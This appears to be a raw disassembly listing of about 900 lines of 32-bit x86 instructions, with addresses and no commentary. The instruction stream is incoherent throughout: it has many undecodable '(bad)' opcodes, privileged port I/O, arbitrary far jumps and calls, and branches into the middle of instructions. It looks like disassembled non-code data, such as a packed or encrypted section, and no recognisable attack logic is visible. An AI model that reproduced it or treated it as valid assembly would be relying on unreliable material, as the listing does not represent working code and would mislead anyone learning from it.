  4079da:	or     DWORD PTR [eax],esp
  4079dc:	neg    DWORD PTR [edx+0x21]
  4079df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079e0:	rol    BYTE PTR [esi],1
  4079e2:	cmp    BYTE PTR [ebp+eax*4+0x68],bl
  4079e6:	out    dx,al
  4079e7:	dec    edx
  4079e8:	xor    eax,0x58d41bfc
  4079ed:	adc    DWORD PTR [edx],ebx
  4079ef:	mov    ds:0x63e070cf,eax
  4079f4:	xchg   ecx,eax
  4079f5:	xchg   esp,eax
  4079f6:	in     eax,dx
  4079f7:	adc    al,dh
  4079f9:	leave  
  4079fa:	push   ss
  4079fb:	fidiv  DWORD PTR es:[esi+0x6b]
  4079ff:	push   ecx
  407a00:	or     DWORD PTR [edi+0x67c92b4e],ebx
  407a06:	pusha  
  407a07:	cmp    al,0xc4
  407a09:	sub    DWORD PTR [ecx+eax*1-0x3c],eax
  407a0d:	cmp    ecx,DWORD PTR [ebx]
  407a0f:	inc    ebp
  407a10:	push   esp
  407a11:	cmp    ebp,DWORD PTR [edi+eiz*4]
  407a14:	lods   eax,DWORD PTR ds:[esi]
  407a15:	out    0x37,eax
  407a17:	int3   
  407a18:	test   ch,al
  407a1a:	mov    eax,0x7436d81d
  407a1f:	sar    BYTE PTR [ecx+0x7d],1
  407a22:	mov    bh,0x1
  407a24:	mov    eax,esp
  407a26:	sub    al,0xf6
  407a28:	lods   al,BYTE PTR ds:[esi]
  407a29:	mov    eax,edx
  407a2b:	mov    ds:0x4611d237,eax
  407a30:	(bad)  
  407a31:	sti    
  407a32:	xor    al,0x8e
  407a34:	in     eax,dx
  407a35:	pop    esp
  407a36:	xor    al,0x8d
  407a38:	icebp  
  407a39:	out    dx,eax
  407a3a:	mov    cl,0x90
  407a3c:	add    eax,0xf9cb1976
  407a41:	mov    DWORD PTR [ebp+eax*4+0x5e],ebp
  407a45:	pop    edx
  407a46:	aam    0x20
  407a48:	push   es
  407a49:	xchg   esi,eax
  407a4a:	add    ch,cl
  407a4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a4d:	fst    DWORD PTR [esi-0x41060d4]
  407a53:	repz mov esi,0x8e7e4c21
  407a59:	mov    al,0x9c
  407a5b:	mov    bl,0x47
  407a5d:	sub    al,0x8f
  407a5f:	mov    eax,0xa332c18e
  407a64:	cwde   
  407a65:	les    ebx,FWORD PTR [esi-0x64cf0918]
  407a6b:	mov    ds:0x9d878000,eax
  407a70:	push   ecx
  407a71:	js     0x407a53
  407a73:	ret    0x78a9
  407a76:	pop    ds
  407a77:	sti    
  407a78:	xlat   BYTE PTR ds:[ebx]
  407a79:	and    cl,al
  407a7b:	aam    0xb9
  407a7d:	aad    0x93
  407a7f:	call   0x7022:0xb8e3d5e3
  407a86:	xchg   esi,eax
  407a87:	cdq    
  407a88:	bound  edx,QWORD PTR [edi+0x68]
  407a8b:	imul   BYTE PTR [edi+esi*8+0x41]
  407a8f:	data16 jle 0x407a55
  407a92:	sbb    ebx,DWORD PTR [edx+0x66]
  407a95:	dec    ebx
  407a96:	shl    dh,1
  407a98:	scas   al,BYTE PTR es:[edi]
  407a99:	aad    0xf
  407a9b:	jo     0x407aaa
  407a9d:	mov    ebx,0x68aafe5d
  407aa2:	jecxz  0x407a75
  407aa4:	mov    dl,0x42
  407aa6:	jno    0x407a42
  407aa8:	inc    esp
  407aa9:	push   ebx
  407aaa:	add    ecx,DWORD PTR [ebx]
  407aac:	loopne 0x407adf
  407aae:	xchg   DWORD PTR [eax+ecx*8+0x1],esp
  407ab2:	inc    edi
  407ab3:	call   FWORD PTR [eax+0xc90f6a]
  407ab9:	adc    al,0x41
  407abb:	adc    dh,BYTE PTR [esi]
  407abd:	cmp    ebx,DWORD PTR [ecx-0x36]
  407ac0:	test   DWORD PTR [esi],esi
  407ac2:	pushf  
  407ac3:	daa    
  407ac4:	sbb    DWORD PTR [edi-0x74],esi
  407ac7:	mov    bl,0x79
  407ac9:	lods   al,BYTE PTR ds:[esi]
  407aca:	(bad)  
  407acb:	adc    eax,0x74e14533
  407ad0:	mov    esi,0x3390b15e
  407ad5:	mov    edx,0x3e97f21f
  407ada:	cs or  esp,esi
  407add:	push   edx
  407ade:	mov    al,ds:0x451c7ba0
  407ae3:	inc    esp
  407ae4:	pop    es
  407ae5:	(bad)  
  407ae6:	sbb    BYTE PTR [ecx-0x6e],bl
  407ae9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407aea:	sbb    BYTE PTR [ebx-0x42],bh
  407aed:	int    0x3b
  407aef:	fcmovb st,st(2)
  407af1:	enter  0xa8aa,0x86
  407af5:	mov    ds:0xb74f4655,al
  407afa:	jne    0x407b65
  407afc:	and    bh,BYTE PTR [edi+esi*4]
  407aff:	add    al,0xc3
  407b01:	jno    0x407b1b
  407b03:	(bad)  
  407b04:	push   cs
  407b05:	(bad)  
  407b07:	mov    cl,0x8
  407b09:	(bad)  
  407b0d:	fdiv   st,st(5)
  407b0f:	test   al,0xed
  407b11:	mov    ah,0xe4
  407b13:	scas   al,BYTE PTR es:[edi]
  407b14:	dec    ebp
  407b15:	sar    DWORD PTR [eax-0x1c],1
  407b18:	in     eax,dx
  407b19:	push   ebp
  407b1a:	add    DWORD PTR [esi+0x83938a0],eax
  407b20:	inc    dx
  407b22:	and    BYTE PTR [edi],0xcc
  407b25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b26:	mov    edx,0xba3b9f54
  407b2b:	in     eax,0x5c
  407b2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b2e:	xor    DWORD PTR [ecx+0x3d2dea31],edi
  407b34:	xchg   ebp,eax
  407b35:	rcr    BYTE PTR [edi+0x74],1
  407b38:	pop    ebx
  407b39:	jl     0x407af0
  407b3b:	sahf   
  407b3c:	push   es
  407b3d:	inc    edi
  407b3e:	jne    0x407af3
  407b40:	mov    dl,0x37
  407b42:	add    eax,0x7ae82c4a
  407b47:	dec    esi
  407b48:	cmp    dl,BYTE PTR [eax-0x38]
  407b4b:	clc    
  407b4c:	and    ch,ch
  407b4e:	mov    ds:0xa0818b3a,al
  407b53:	fadd   DWORD PTR [edi+0x143ac53c]
  407b59:	inc    ebx
  407b5a:	inc    ebx
  407b5b:	hlt    
  407b5c:	push   es
  407b5d:	add    al,0xb9
  407b5f:	push   ds
  407b60:	adc    DWORD PTR fs:[ebx+esi*1-0x3e],0xe36c5786
  407b69:	inc    edi
  407b6a:	sub    eax,DWORD PTR [edx]
  407b6c:	sub    bl,BYTE PTR [ebp-0x16]
  407b6f:	push   edi
  407b70:	and    BYTE PTR [edi],ah
  407b72:	hlt    
  407b73:	in     eax,dx
  407b74:	daa    
  407b75:	fwait
  407b76:	jb     0x407b8b
  407b78:	and    dl,BYTE PTR [esi-0x7f]
  407b7b:	mov    ebx,DWORD PTR [ebx+edx*4]
  407b7e:	sbb    BYTE PTR [ebp+ebx*1+0x59],ah
  407b82:	xor    edi,DWORD PTR [esi+ebp*1]
  407b85:	adc    eax,0x2f250d9a
  407b8a:	stos   BYTE PTR es:[edi],al
  407b8b:	and    al,0xb9
  407b8d:	dec    esp
  407b8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b90:	fld    QWORD PTR [eax+0x5de1c4de]
  407b96:	xor    eax,0xf8c2a05
  407b9b:	xor    dl,BYTE PTR [edx]
  407b9d:	sub    eax,0x80c7f6a1
  407ba2:	shr    eax,cl
  407ba4:	cld    
  407ba5:	mov    al,ds:0x35266537
  407baa:	mov    dl,0xc2
  407bac:	nop
  407bad:	mov    esi,0x29c76903
  407bb2:	mov    bl,0xc7
  407bb4:	ja     0x407b59
  407bb6:	popf   
  407bb7:	sub    al,0xf2
  407bb9:	or     DWORD PTR [eax+ecx*2-0x36],0x17
  407bbe:	cmp    bh,ch
  407bc0:	daa    
  407bc1:	iret   
  407bc2:	inc    eax
  407bc3:	mov    ds:0xc977c723,eax
  407bc8:	rcl    BYTE PTR [esi+ebx*1-0x64],0x2
  407bcd:	ja     0x407bce
  407bcf:	cmp    BYTE PTR [ebx+edx*8-0x8258a0f],bh
  407bd6:	and    ebp,ebp
  407bd8:	dec    eax
  407bd9:	cwde   
  407bda:	(bad)  
  407bdb:	dec    edi
  407bdc:	sbb    DWORD PTR [edi],eax
  407bde:	or     eax,0xbe843154
  407be3:	pop    ecx
  407be4:	dec    eax
  407be5:	jno    0x407c5c
  407be7:	aad    0x54
  407be9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bea:	test   dh,0x20
  407bed:	out    0x30,al
  407bef:	es add eax,0x67e8e6a
  407bf5:	int3   
  407bf6:	div    DWORD PTR [edx]
  407bf8:	(bad)  
  407bfa:	mov    dl,BYTE PTR [edi+edx*2]
  407bfd:	inc    ebp
  407bfe:	mov    edi,DWORD PTR [ebp+edi*1-0x5bde4e46]
  407c05:	sub    al,0x36
  407c07:	mov    cl,0xfd
  407c09:	scas   al,BYTE PTR es:[edi]
  407c0a:	in     eax,dx
  407c0b:	js     0x407c2c
  407c0d:	pop    ebx
  407c0e:	add    DWORD PTR [edi+0x64ccca35],ebp
  407c14:	fadd   st,st(0)
  407c16:	in     al,0x5a
  407c18:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  407c1a:	(bad)  
  407c1b:	xor    BYTE PTR [bx+0x18],bh
  407c1f:	inc    edi
  407c20:	fstp   DWORD PTR [ebx+0x8a8c003]
  407c26:	xor    ecx,0x3cb80cd6
  407c2c:	lock ins DWORD PTR es:[edi],dx
  407c2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c2f:	pop    ds
  407c30:	mov    BYTE PTR [ebx+0x34],bl
  407c33:	test   ecx,ebx
  407c35:	inc    esi
  407c36:	in     eax,0x52
  407c38:	(bad)  
  407c39:	adc    DWORD PTR [eax-0x53],ebx
  407c3c:	xchg   esp,eax
  407c3d:	mov    ds:0x5612406c,al
  407c42:	in     al,dx
  407c43:	jb     0x407bfd
  407c45:	out    dx,eax
  407c46:	sahf   
  407c47:	and    bl,BYTE PTR [ebx+ecx*2-0x26]
  407c4b:	push   ebx
  407c4c:	dec    ebp
  407c4d:	nop
  407c4e:	adc    DWORD PTR [esi-0x492eabf7],ecx
  407c54:	or     eax,0x23a6152c
  407c59:	fcmovb st,st(2)
  407c5b:	sub    DWORD PTR [ecx+0x77],eax
  407c5e:	mov    ch,0xb5
  407c60:	mov    esi,0x940e8193
  407c65:	test   eax,0x3c5c6c
  407c6a:	or     eax,0x7c88cfdc
  407c6f:	mov    BYTE PTR [esi+eax*8+0x4a262b63],0x78
  407c77:	iret   
  407c78:	(bad)  
  407c79:	out    dx,eax
  407c7a:	je     0x407c29
  407c7c:	pop    ebx
  407c7d:	or     BYTE PTR [edi+0x4b09012f],cl
  407c83:	adc    eax,ebx
  407c85:	pop    ss
  407c86:	dec    edi
  407c87:	cmp    eax,0xb2eb8269
  407c8c:	lds    edi,FWORD PTR [ecx]
  407c8e:	mov    cl,0x11
  407c90:	dec    edi
  407c91:	mov    dh,0x96
  407c93:	mov    BYTE PTR [ecx],dl
  407c95:	dec    esp
  407c96:	js     0x407d0b
  407c98:	pusha  
  407c99:	jmp    0x407cb8
  407c9b:	xlat   BYTE PTR ds:[ebx]
  407c9c:	dec    esp
  407c9d:	mov    ds:0x45e1ce79,al
  407ca2:	xor    cl,0x8c
  407ca5:	push   esi
  407ca6:	je     0x407cb1
  407ca8:	xchg   esp,eax
  407ca9:	add    al,0x6b
  407cab:	mov    eax,ds:0x4ceeb45
  407cb0:	adc    ebx,DWORD PTR [ecx-0x73]
  407cb3:	or     ebx,0xffffffae
  407cb6:	inc    edi
  407cb7:	ins    BYTE PTR es:[edi],dx
  407cb8:	imul   ecx,DWORD PTR [edi+edi*8],0x15
  407cbc:	sahf   
  407cbd:	pop    ds
  407cbe:	sub    al,0x5c
  407cc0:	fdivr  DWORD PTR [eax+0xd7b5ce2]
  407cc6:	nop
  407cc7:	cli    
  407cc8:	xchg   DWORD PTR [edi+0x13],edi
  407ccb:	cmp    ebx,DWORD PTR [ebx]
  407ccd:	xchg   ecx,eax
  407cce:	mov    WORD PTR [ebx-0x40107acc],cs
  407cd4:	popf   
  407cd5:	pop    ds
  407cd6:	or     DWORD PTR [ebx-0x2d],eax
  407cd9:	jecxz  0x407d1d
  407cdb:	adc    esp,DWORD PTR [esp+ebx*2]
  407cde:	and    al,0xf0
  407ce0:	popa   
  407ce1:	add    eax,0x1f19360b
  407ce6:	les    eax,FWORD PTR [edx+0x1651c120]
  407cec:	inc    esi
  407ced:	rcr    DWORD PTR [edi],1
  407cef:	sbb    BYTE PTR [eax-0x6608080d],ch
  407cf5:	adc    DWORD PTR [ecx],eax
  407cf7:	jp     0x407d1f
  407cf9:	sub    eax,0xdb7bcf94
  407cfe:	outs   dx,DWORD PTR ds:[esi]
  407cff:	mov    dh,0x5e
  407d01:	or     ch,BYTE PTR [ebp+0x4f]
  407d04:	pop    eax
  407d05:	repnz or DWORD PTR [ebx-0x24ffa9ff],ebp
  407d0c:	xchg   esp,eax
  407d0d:	icebp  
  407d0e:	xchg   esi,eax
  407d0f:	push   ecx
  407d10:	jmp    0x5a0df15
  407d15:	dec    ebp
  407d16:	gs iret 
  407d18:	xor    edi,DWORD PTR [ebp+0x52]
  407d1b:	sbb    esp,edx
  407d1d:	xor    DWORD PTR [edx+0x17],ebp
  407d20:	iret   
  407d21:	lahf   
  407d22:	out    dx,al
  407d23:	inc    edi
  407d24:	in     eax,0x39
  407d26:	xchg   esp,eax
  407d27:	int    0xf8
  407d29:	loope  0x407d4b
  407d2b:	add    cl,BYTE PTR ds:0x41b70aa9
  407d31:	cmp    esi,ecx
  407d33:	cmp    eax,0xfde45855
  407d38:	and    eax,0x9cc8be79
  407d3d:	cmp    ah,BYTE PTR [eax+0x164f80ee]
  407d43:	push   ss
  407d44:	jb     0x407d7a
  407d46:	push   edx
  407d47:	imul   DWORD PTR [esi-0x5bcc00e]
  407d4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d4e:	push   esp
  407d4f:	clc    
  407d50:	test   al,0x1e
  407d52:	push   edi
  407d53:	cmp    edx,DWORD PTR gs:[edi-0x7f]
  407d57:	mov    al,ds:0xba00ec81
  407d5c:	(bad)  
  407d5d:	in     eax,0x56
  407d5f:	mov    eax,ds:0xc469e1ba
  407d64:	stos   BYTE PTR es:[edi],al
  407d65:	fisttp WORD PTR [ecx+0x11]
  407d68:	adc    al,bl
  407d6a:	retf   0xa3a5
  407d6d:	lock jbe 0x407de8
  407d70:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d72:	add    ebp,DWORD PTR [ecx+edx*4+0x2de195ac]
  407d79:	imul   edx,DWORD PTR [ebp-0x4698e0b3],0x53
  407d80:	in     eax,dx
  407d81:	inc    edx
  407d82:	or     al,0x9
  407d84:	jg     0x407dfd
  407d86:	jne    0x407d50
  407d88:	inc    edi
  407d89:	fcom   QWORD PTR [edx+edi*4-0x37]
  407d8d:	pop    ebp
  407d8e:	jle    0x407db9
  407d90:	pop    ss
  407d91:	cmp    eax,0xee5b3f5f
  407d96:	add    eax,0x5c6357d
  407d9b:	or     DWORD PTR [ebx],esp
  407d9d:	fcomp  st(1)
  407d9f:	push   0xe54c954b
  407da4:	scas   eax,DWORD PTR es:[edi]
  407da5:	dec    eax
  407da6:	je     0x407db3
  407da8:	sbb    DWORD PTR [esi+0x1a],ecx
  407dab:	retf   0xcad5
  407dae:	mov    esp,0x7ad0ae53
  407db3:	popa   
  407db4:	dec    ebp
  407db5:	frstor [esi]
  407db7:	rol    DWORD PTR [ebp-0x3af29897],0xd4
  407dbe:	xchg   ebx,eax
  407dbf:	xchg   BYTE PTR [edi+ecx*4+0x678168bc],ch
  407dc6:	sbb    BYTE PTR ds:0x5a475c77,bh
  407dcc:	and    dh,BYTE PTR [eax]
  407dce:	cli    
  407dcf:	daa    
  407dd0:	data16 jg 0x407d7c
  407dd3:	lea    ecx,[ecx-0x75]
  407dd6:	and    DWORD PTR [esi],ebx
  407dd8:	push   0x63365187
  407ddd:	in     eax,0xd5
  407ddf:	mov    eax,ds:0x12655791
  407de4:	or     ebx,ecx
  407de6:	push   cs
  407de7:	adc    BYTE PTR [ebx+eax*2-0x2e],0x33
  407dec:	or     DWORD PTR ss:[esi+eiz*8+0x453abdd],edi
  407df4:	out    dx,eax
  407df5:	aas    
  407df6:	out    0xb3,eax
  407df8:	aaa    
  407df9:	leave  
  407dfa:	sbb    DWORD PTR [ebp+0x6757fdc6],eax
  407e00:	adc    BYTE PTR [esi-0x64c329e0],dl
  407e06:	dec    WORD PTR [esi-0x18e6e1a]
  407e0d:	stos   BYTE PTR es:[edi],al
  407e0e:	jp     0x407dfa
  407e10:	data16 sbb al,0x3f
  407e13:	stc    
  407e14:	add    al,0x8
  407e16:	sub    DWORD PTR [esi+0x7d],ebp
  407e19:	repnz push 0x5eec607a
  407e1f:	ror    edi,1
  407e21:	out    dx,eax
  407e22:	push   ebx
  407e23:	xor    BYTE PTR [ecx],ah
  407e25:	retf   0x73b
  407e28:	sub    al,BYTE PTR [edi-0x74]
  407e2b:	mov    DWORD PTR [ecx+0x19],esp
  407e2e:	mov    bh,0x34
  407e30:	fisubr DWORD PTR [ebx]
  407e32:	fadd   QWORD PTR [edx+0x10]
  407e35:	add    BYTE PTR [ecx],0xbc
  407e38:	popf   
  407e39:	aad    0xcb
  407e3b:	cmp    BYTE PTR [ecx],bh
  407e3d:	daa    
  407e3e:	fcom   st(1)
  407e40:	fwait
  407e41:	sub    eax,0xf9f2ae16
  407e46:	mov    edi,edi
  407e48:	(bad)  
  407e49:	cli    
  407e4a:	cld    
  407e4b:	mov    edi,0x68eebcc2
  407e50:	xor    DWORD PTR [edi-0x4],0x47
  407e54:	mov    ds:0x6a53ac67,al
  407e59:	test   BYTE PTR ds:0x3646aa8b,dh
  407e5f:	int3   
  407e60:	and    eax,0x20cdbaaf
  407e65:	mov    esp,cs
  407e67:	shl    DWORD PTR [eax+ebp*1],1
  407e6a:	ja     0x407e3b
  407e6c:	adc    bh,al
  407e6e:	clc    
  407e6f:	pop    ecx
  407e70:	fmul   QWORD PTR [edi]
  407e72:	ja     0x407eeb
  407e74:	pop    ebx
  407e75:	mov    dh,0xf8
  407e77:	jnp    0x407ec4
  407e79:	and    BYTE PTR [edi],bl
  407e7b:	sub    al,0x9e
  407e7d:	ins    DWORD PTR es:[edi],dx
  407e7e:	call   0x2c17:0x8810079f
  407e85:	sub    ebx,esi
  407e87:	cmp    ah,BYTE PTR [ebp+0x69ecef6c]
  407e8d:	inc    edx
  407e8e:	in     al,0xf0
  407e90:	pop    ecx
  407e91:	inc    ebp
  407e92:	pushf  
  407e93:	aaa    
  407e94:	jno    0x407ef2
  407e96:	out    dx,eax
  407e97:	pop    esi
  407e98:	div    BYTE PTR ds:0x4bcd0a87
  407e9e:	test   DWORD PTR ds:[eax-0x15],esi
  407ea2:	jmp    0x8134:0x41466aa9
  407ea9:	punpcklbw mm3,DWORD PTR [esi+0x609bc85]
  407eb0:	or     al,0x28
  407eb2:	jmp    0x4d26d3
  407eb7:	mov    esp,0x2f2e4208
  407ebc:	xor    ecx,DWORD PTR [ebx-0x11]
  407ebf:	jg     0x407e4b
  407ec1:	popa   
  407ec2:	cmp    ebx,DWORD PTR gs:[ecx]
  407ec5:	jae    0x407e74
  407ec7:	cmc    
  407ec8:	nop
  407ec9:	mov    bh,0x5e
  407ecb:	loop   0x407f03
  407ecd:	fwait
  407ece:	call   0xefb:0x1700de52
  407ed5:	mov    ds:0x20e87560,eax
  407eda:	mov    cl,0x74
  407edc:	mov    dh,0x46
  407ede:	pop    esp
  407edf:	in     eax,dx
  407ee0:	nop
  407ee1:	push   ebp
  407ee2:	push   0x66
  407ee4:	js     0x407eae
  407ee6:	jmp    0x407f1f
  407ee8:	fstp   DWORD PTR [edx+edx*4]
  407eeb:	sub    BYTE PTR [esi],dl
  407eed:	adc    al,BYTE PTR ds:0xc4ac42d0
  407ef3:	pusha  
  407ef4:	mov    BYTE PTR [edx+0x3f5582c5],al
  407efa:	jg     0x407ea2
  407efc:	ins    DWORD PTR es:[edi],dx
  407efd:	test   al,0xd3
  407eff:	mov    dl,0x5e
  407f01:	and    esp,ebx
  407f03:	icebp  
  407f04:	ins    DWORD PTR es:[edi],dx
  407f05:	mov    esp,0x737e53c7
  407f0a:	in     eax,dx
  407f0b:	mov    BYTE PTR [eax+0x6d],al
  407f0e:	sbb    BYTE PTR [ecx],cl
  407f10:	loopne 0x407f84
  407f12:	mov    edx,0x8b2ae69f
  407f17:	bound  ecx,QWORD PTR [ecx-0x55565248]
  407f1d:	mov    ds:0x767c0b48,eax
  407f22:	in     al,0xe7
  407f24:	fsub   QWORD PTR [ecx+0x67]
  407f27:	test   al,0x98
  407f29:	or     DWORD PTR ds:0x4f99c8c7,ebx
  407f2f:	pop    ds
  407f30:	pusha  
  407f31:	outs   dx,BYTE PTR ds:[esi]
  407f32:	xchg   edx,eax
  407f33:	cmp    eax,0x1d37d896
  407f38:	mov    ch,0x4c
  407f3a:	xor    DWORD PTR [esp+edx*8-0x269b0085],0x5d4a6edb
  407f45:	lds    edx,FWORD PTR [edx+0x6106554f]
  407f4b:	ds inc edx
  407f4d:	mov    ecx,0x14632b6f
  407f52:	pushf  
  407f53:	sbb    al,BYTE PTR [eax+0x2b2e0555]
  407f59:	addr16 pop edi
  407f5b:	pushf  
  407f5c:	xchg   edx,eax
  407f5d:	mov    esp,edi
  407f5f:	int    0xfc
  407f61:	mov    ecx,0x42b07093
  407f66:	mov    edx,0xc748b9dd
  407f6b:	add    ecx,edx
  407f6d:	jp     0x407f8e
  407f6f:	dec    eax
  407f70:	je     0x407fcd
  407f72:	fistp  QWORD PTR [edx-0x8a1f20b]
  407f78:	sub    esp,esp
  407f7a:	fidivr DWORD PTR [ebp-0x6e]
  407f7d:	iret   
  407f7e:	mov    ch,0x78
  407f80:	jl     0x407f67
  407f82:	loope  0x407f55
  407f84:	mov    eax,0xf887417b
  407f89:	pop    ebp
  407f8a:	pop    ss
  407f8b:	and    al,0x45
  407f8d:	lock ret 
  407f8f:	add    edx,DWORD PTR [edi-0x62edce69]
  407f95:	or     DWORD PTR ds:0xa06dab1f,ecx
  407f9b:	pop    ebp
  407f9c:	push   ss
  407f9d:	cmp    DWORD PTR [ecx+0x6a83741c],edi
  407fa3:	outs   dx,BYTE PTR ds:[esi]
  407fa4:	mov    esi,0x7cb27c4e
  407fa9:	(bad)  
  407faa:	aam    0x6d
  407fac:	xchg   esp,eax
  407fad:	or     ecx,esp
  407faf:	rol    dh,cl
  407fb1:	push   ecx
  407fb2:	push   es
  407fb3:	mov    ebx,0xb5f2d924
  407fb8:	cwde   
  407fb9:	pop    edx
  407fba:	inc    BYTE PTR [ebx+0xf0c7c9b]
  407fc0:	xor    al,0xe7
  407fc2:	xor    BYTE PTR [ecx],dh
  407fc4:	fstp   DWORD PTR [bx+di-0x4605]
  407fc9:	retf   
  407fca:	dec    esi
  407fcb:	retf   
  407fcc:	mov    BYTE PTR [ebp+ecx*8-0x7],0x6b
  407fd1:	in     al,dx
  407fd2:	mov    bh,0xaa
  407fd4:	in     al,0x49
  407fd6:	daa    
  407fd7:	rcr    cl,1
  407fd9:	iret   
  407fda:	das    
  407fdb:	xor    eax,0xbabb9316
  407fe0:	loopne 0x407ffd
  407fe2:	jmp    0xef5c:0x75114ea0
  407fe9:	mov    ?,WORD PTR [eax+0x34]
  407fec:	mov    eax,0x9e30b3a2
  407ff1:	es jmp 0x9a5b9ac0
  407ff7:	(bad)  
  407ff8:	into   
  407ff9:	scas   eax,DWORD PTR es:[edi]
  407ffa:	imul   DWORD PTR [ebx-0x39]
  407ffd:	jne    0x408052
  407fff:	(bad)  
  408000:	not    DWORD PTR [edx]
  408002:	in     al,dx
  408003:	xor    dl,BYTE PTR [ebx]
  408005:	icebp  
  408006:	addr16 adc eax,0x89027f0f
  40800c:	loopne 0x40804e
  40800e:	ins    BYTE PTR es:[edi],dx
  40800f:	sar    BYTE PTR [eax],cl
  408011:	into   
  408012:	xor    ch,dh
  408014:	(bad)  [edi]
  408016:	aam    0xf6
  408018:	out    0x4b,al
  40801a:	xchg   ecx,eax
  40801b:	clc    
  40801c:	clc    
  40801d:	adc    eax,esp
  40801f:	mov    bl,0x20
  408021:	mov    edx,0xfd6ecad9
  408026:	lock pop esi
  408028:	jae    0x407fd3
  40802a:	jo     0x40803c
  40802c:	rcr    BYTE PTR [ecx],0x3c
  40802f:	dec    ecx
  408030:	mov    ds:0xf120235f,al
  408035:	scas   eax,DWORD PTR es:[edi]
  408036:	jo     0x408063
  408038:	or     edx,edi
  40803a:	(bad)  
  40803b:	jae    0x407ff2
  40803d:	ds jl  0x40802d
  408040:	push   ds
  408041:	mov    BYTE PTR [esi],ch
  408043:	cs mov ebx,0xcedb7ae6
  408049:	xor    DWORD PTR [edi+0x3a],esi
  40804c:	les    ebp,FWORD PTR [esi]
  40804e:	int    0xf4
  408050:	mov    edx,fs
  408052:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  408054:	(bad)  
  408055:	fadd   st,st(3)
  408057:	pop    ecx
  408058:	(bad)  
  408059:	stc    
  40805a:	dec    ecx
  40805b:	push   ss
  40805c:	pop    ds
  40805d:	push   esp
  40805e:	pop    edx
  40805f:	push   ss
  408060:	add    eax,0xfe99b3fd
  408065:	xchg   ebp,eax
  408066:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408067:	xor    eax,0xe68e592a
  40806c:	inc    edx
  40806d:	jb     0x4080eb
  40806f:	sub    al,0x24
  408071:	mov    eax,DWORD PTR [eax-0x2be41d24]
  408077:	or     ah,ah
  408079:	jnp    0x40809e
  40807b:	add    ebp,esi
  40807d:	bt     DWORD PTR [edx],eax
  408080:	fucomp st(6)
  408082:	jge    0x408069
  408084:	lds    edx,FWORD PTR [edi+0x63f36793]
  40808a:	xor    edi,DWORD PTR [eax-0x6a]
  40808d:	je     0x408108
  40808f:	out    0xf8,al
  408091:	cmp    al,0xfb
  408093:	add    DWORD PTR [edx+0x46],ebp
  408096:	dec    edx
  408097:	and    BYTE PTR [ebx-0x1d4ea7a],dl
  40809d:	mov    esi,0x8905cdc1
  4080a2:	sbb    eax,0xdb8d1d1f
  4080a7:	mov    cl,0xa4
  4080a9:	sub    eax,0x2a53bd87
  4080ae:	je     0x4080dc
  4080b0:	inc    edi
  4080b1:	lea    esp,[ebx+0x21]
  4080b4:	adc    ebp,DWORD PTR [esi]
  4080b6:	xchg   DWORD PTR [eax+eax*1+0x14],ebx
  4080ba:	test   al,0x2a
  4080bc:	and    eax,0xb68e2808
  4080c1:	int    0x81
  4080c3:	jb     0x4080d0
  4080c5:	and    al,0x67
  4080c7:	xchg   edi,eax
  4080c8:	inc    edi
  4080c9:	lods   al,BYTE PTR ds:[esi]
  4080ca:	push   0xa7a772b4
  4080cf:	jge    0x40810f
  4080d1:	pushf  
  4080d2:	xchg   edx,eax
  4080d3:	inc    eax
  4080d4:	inc    edx
  4080d5:	sub    edx,DWORD PTR [eax-0x34]
  4080d8:	cmp    DWORD PTR [ebx],0xffffffa6
  4080db:	add    DWORD PTR [eax],ecx
  4080dd:	sbb    esi,esp
  4080df:	cdq    
  4080e0:	add    al,0xfe
  4080e2:	(bad)  
  4080e3:	daa    
  4080e4:	(bad)  
  4080e5:	push   ecx
  4080e6:	out    dx,al
  4080e7:	(bad)  
  4080e9:	lea    edx,[edx+0x4b]
  4080ec:	arpl   WORD PTR [ecx],ax
  4080ee:	or     BYTE PTR [ecx],cl
  4080f0:	call   0x9bce:0x9787a3cd
  4080f7:	aad    0x2a
  4080f9:	mov    bh,0xb8
  4080fb:	ins    DWORD PTR es:[edi],dx
  4080fc:	(bad)  
  4080fd:	cdq    
  4080fe:	faddp  st(1),st
  408100:	fwait
  408101:	nop
  408102:	fstp   TBYTE PTR [eax+0x2cc2f9e0]
  408108:	cmp    edi,DWORD PTR [edi]
  40810a:	aaa    
  40810b:	add    bh,BYTE PTR [esi+0x6f1f00e9]
  408111:	mov    ebp,0x79877552
  408116:	rcr    DWORD PTR [eax],1
  408118:	jge    0x4080e3
  40811a:	dec    ecx
  40811b:	mov    al,ds:0x8409822f
  408120:	fs test eax,0x93c8122f
  408126:	dec    edx
  408127:	imul   ebx,esi,0x49697e09
  40812d:	xor    ebp,DWORD PTR [eax+0x450b9cab]
  408133:	sub    DWORD PTR [edx+0xe],ecx
  408136:	pop    ecx
  408137:	retf   0xcece
  40813a:	out    dx,eax
  40813b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40813c:	xchg   DWORD PTR [esi+0x7d2cda53],edi
  408142:	cmp    DWORD PTR [edx+ecx*8-0x78],0xa9d3c3ed
  40814a:	pop    eax
  40814b:	pop    es
  40814c:	push   ecx
  40814d:	push   es
  40814e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40814f:	ret    0x9054
  408152:	mov    eax,0x1a0d1d3e
  408157:	push   ebx
  408158:	jmp    0x408136
  40815a:	push   ebp
  40815b:	mov    dh,0x45
  40815d:	cld    
  40815e:	mov    eax,ds:0x6a7e0ae7
  408163:	cmc    
  408164:	idiv   DWORD PTR [eax]
  408166:	into   
  408167:	icebp  
  408168:	sub    BYTE PTR [edx+esi*2-0x4f],dl
  40816c:	loop   0x4081b8
  40816e:	and    ebx,DWORD PTR [eax-0x5d]
  408171:	jbe    0x40810d
  408173:	rcl    cl,0xb7
